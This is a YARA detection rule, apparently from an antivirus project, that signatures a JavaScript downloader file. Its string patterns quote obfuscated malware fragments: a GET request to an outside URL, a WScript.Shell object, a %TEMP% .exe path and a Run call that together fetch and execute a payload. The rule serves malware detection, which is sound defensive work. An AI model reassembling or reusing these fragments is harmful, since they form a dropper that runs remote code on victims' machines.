rule sig_20160401_14ca3e32e2f2d1a47162fd5ee44632e3 {
  meta:
    description = "datamaliciousorder - file 20160401_14ca3e32e2f2d1a47162fd5ee44632e3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "628dfc158c895e411c35f40f73bda00ee468fee7ec582732f3e2e2e7d9477f4d"

  strings:
    $s1  = "VfSbu[UwEgi](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "var NqtFp = function BuvDqi() {return WScript[HwqJu](\"WScript\"+\".Shell\");}(), DsVc = 11;" fullword ascii
    $s3  = "function OhbEl(LaeOj, BhbZk){MqRr = MqRr * 1; return LaeOj - BhbZk;};" fullword ascii
    $s4  = "if (VfSbu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BqBv(){return ThyUuk + \"\";};" fullword ascii
    $s6  = "function IlsEm() {return NqtFp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"STHvniNu.ex\" + \"e\";};" fullword ascii
    $s7  = "function LwIt() {return ((MhHpy == true) && (MhHpy == FqyCu)) ? 1 : MqRr;};" fullword ascii
    $s8  = "function NytNs(LtIh) {var BjOol = (1, 2, 3, 4, 5, LtIh); return BjOol;};" fullword ascii
    $s9  = "var FqyCu = false;" fullword ascii
    $s10 = "var RozYi = new this[\"Date\"]();" fullword ascii
    $s11 = "MhHpy = true; " fullword ascii
    $s12 = "function QmuQi(){return HwqJu;};" fullword ascii
    $s13 = "var HqzMp = false;" fullword ascii
    $s14 = "FqyCu = true; " fullword ascii
    $s15 = "function GfKg()" fullword ascii
    $s16 = "function CgiEna(){return 23;};" fullword ascii
    $s17 = "}while (TqNzv);" fullword ascii
    $s18 = "return OhbEl(NdxEv, GjkAgy);" fullword ascii
    $s19 = "var MhHpy = false;" fullword ascii
    $s20 = "function XaYm(JnqEkh){NqtFp[\"R\"+\"un\"](JnqEkh, MqRr, MqRr);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}